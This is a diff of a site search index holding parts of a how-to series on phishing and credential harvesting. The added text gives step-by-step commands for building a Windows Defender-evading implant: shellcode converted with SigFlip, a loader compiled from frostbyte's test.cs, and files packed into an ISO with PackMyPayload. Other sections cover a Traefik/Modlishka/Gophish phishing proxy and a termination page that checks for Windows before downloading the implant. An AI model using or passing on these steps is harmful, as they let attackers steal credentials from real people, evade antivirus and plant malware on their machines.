@@ -86,12 +86,17 @@ Add some additional configuration to the modlishka container so Traefik can act 
 Now we can test it out.
 sudo docker compose up Now we can use our new traefik URL as our Gophish URL in a phishing campaign.
 `,description:"",tags:null,title:"Traefik Reverse Proxy",uri:"/how_to/phishing-credential-harvesting-and-beyond/95-traefik-reverse-proxy/index.html"},{content:`Better implants (frostbyte bypass windows defender) Instead of generating a executable. We can generate shellcode. We can then use something like https://github.com/pwn1sher/frostbyte to load that shellcode into memory and execute it.
-Lets get download the frostbyte zip from Github.
+Lets get download the frostbyte zip from Github. Extract it to the desktop.
 We need a .net binary with a .exe.config file. Windows has lots of those in C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319.
-Lets conver our shell code.
-Update the code in ….
-build ….
-test ….
+Generate shellcode
+./SigFlip.exe -i "C:\\Users\\Administrator\\Desktop\\frostbyte-main\\jsc.exe" "C:\\Users\\Administrator\\Desktop\\frostbyte-main\\beacon64.bin" "C:\\Users\\Administrator\\Desktop\\frostbyte-main\\test.exe" "secret" We need to update the config file and replace the values of update and A54IPK. We also need to update privatePath to be a relative path .
+open test.cs in visual studio. change the value of A54IPK
+byte[] _peBlob = Read("test.exe"); byte[] _data = Decrypt(shellcode, "secret"); build ….
+We’ll also want to change some of the code to be a little different
+C:\\windows\\Microsoft.NET\\Framework\\v3.5\\csc.exe /target:library /out:test.dll ..\\frostbyte-main\\test.cs test ….
+PackMyPayload https://github.com/mgeeky/PackMyPayload
+Create a new folder and andd your files (.dll, .exe, .exe.config)
+./PackMyPayload.py --hide test.dll,test.exe.config foldername isoname.iso -v now we should be able to mount the iso and run our exe to get an implant session.
 `,description:"",tags:null,title:"Better Payload Generation",uri:"/how_to/phishing-credential-harvesting-and-beyond/100-better-payload/index.html"},{content:`Terminate to implant download We can set our terminationURL to a place where we are hosting our windows implant. This will require them to authenticate then be redirected to a file download page.
 Lets add our newly generated payload to the ngix container.
 Create a landing page html to be our termination URL. We can use this to execute some js to make sure the target is running windows before we download the file.
